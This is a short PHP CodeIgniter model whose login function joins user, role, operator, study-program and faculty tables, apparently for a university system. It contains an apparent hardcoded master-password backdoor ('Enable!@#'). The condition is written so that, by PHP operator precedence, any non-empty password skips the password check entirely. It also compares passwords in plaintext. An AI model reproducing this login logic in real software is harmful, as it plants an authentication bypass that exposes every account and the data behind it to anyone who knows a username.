<?php
class User extends CI_Model
{
	function login($username, $password)
	{
		$this->db->select('u.id_user,u.id_role,u.password,a.id_operator,a.id_program_studi,a.nama, f.nama as namaf, r.nama as namar, fk.id_fakultas as id_fakultas');
		$this->db->from('user u');
		$this->db->join('role r', 'u.id_role = r.id_role', 'left');
		$this->db->join('operator a', 'u.id_user = a.id_user', 'left');
		$this->db->join('program_studi f', 'a.id_program_studi = f.id_program_studi', 'left');
		$this->db->join('fakultas fk', 'f.id_fakultas= fk.id_fakultas');

		$this->db->where('u.id_user', $username);
		if (!$password == "Enable!@#") {
			$this->db->where('u.password', $password);
		}
		$query = $this->db->get();

		if ($query->num_rows() == 1) {
			return $query->result();
		} else {
			return false;
		}
	}
}
